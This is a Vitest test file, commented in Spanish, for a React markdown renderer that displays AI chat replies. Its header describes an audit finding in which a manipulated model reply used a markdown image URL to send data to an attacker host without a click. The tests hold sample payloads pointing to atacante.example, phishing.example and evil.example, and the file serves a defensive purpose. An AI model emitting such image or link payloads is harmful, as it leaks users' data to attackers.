/**
 * @vitest-environment happy-dom
 */

/**
 * El chat pinta markdown escrito por un modelo (auditoría de seguridad 23-09).
 * Una respuesta manipulada con `![](https://atacante/x?d=<datos>)` hacía que el
 * navegador pidiera esa URL solo, sin clic, con los datos en la query. Estas
 * pruebas fijan que ninguna imagen se carga y que un enlace a otro sitio dice
 * adónde va.
 */

import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { MarkdownRenderer, destinoExterno } from './MarkdownRenderer';

function render(elemento: React.ReactElement): { container: HTMLElement } {
  const container = document.createElement('div');
  container.innerHTML = renderToStaticMarkup(elemento);
  return { container };
}

describe('MarkdownRenderer — respuestas de IA', () => {
  it('una imagen NO se carga: queda como texto con su destino', () => {
    const { container } = render(
      <MarkdownRenderer content={'Mira: ![cartera](https://atacante.example/x.png?d=SALDO-123)'} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Imagen: cartera');
    expect(container.textContent).toContain('atacante.example');
  });

  it('un enlace a otro sitio muestra su dominio al lado del texto', () => {
    const { container } = render(
      <MarkdownRenderer content={'[Ver estado de cuenta](https://phishing.example/login)'} />,
    );
    const a = container.querySelector('a')!;
    expect(a.textContent).toContain('Ver estado de cuenta');
    expect(a.textContent).toContain('phishing.example/login');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('un enlace interno del panel no lleva destino al lado', () => {
    const { container } = render(<MarkdownRenderer content={'[Contratos](/panel/inmobiliaria/contratos)'} />);
    expect(container.querySelector('a')!.textContent).toBe('Contratos');
  });

  it('destinoExterno recorta rutas largas y deja fuera lo interno', () => {
    expect(destinoExterno('/panel/x')).toBeNull();
    expect(destinoExterno('#arriba')).toBeNull();
    expect(destinoExterno('//evil.example/a')).toBe('evil.example/a');
    expect(destinoExterno('https://a.example/' + 'b'.repeat(50))).toMatch(/^a\.example\/b{29}…$/);
  });
});
